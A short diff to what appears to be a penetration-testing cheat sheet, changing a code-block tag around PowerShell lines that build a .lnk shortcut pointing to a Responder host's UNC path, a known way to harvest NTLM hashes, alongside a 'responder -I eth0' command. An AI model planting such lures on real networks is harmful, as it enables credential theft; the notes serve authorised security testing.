@@ -43,7 +43,7 @@ responder -I eth0 -v
 ### Responder linkifle
 
 #### In Powershell, use each command to create a linkfile for Responder
-```ps
+```powershell
 $objShell = New-Object -ComObject WScript.Shell
 $lnk = $objShell.CreateShortcut("C:\Users\<User>\Desktop\<name>.lnk")
 $lnk.TargetPath = "\\<ResponderIP>\@threat.png"
